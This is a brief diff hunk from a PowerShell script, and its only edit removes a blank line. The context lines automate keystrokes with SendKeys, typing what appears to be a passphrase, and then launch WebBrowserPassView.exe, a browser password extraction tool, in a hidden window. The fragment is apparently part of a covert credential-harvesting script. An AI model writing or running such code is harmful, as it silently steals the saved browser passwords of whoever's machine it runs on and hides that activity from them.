@@ -18,7 +18,6 @@ Add-Type -AssemblyName System.Windows.Forms
 Start-Sleep -Seconds 3
 
 [System.Windows.Forms.SendKeys]::SendWait('wbpv28821@')
-
 [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
 
 Start-Process -FilePath '.\WebBrowserPassView.exe' -WindowStyle Hidden
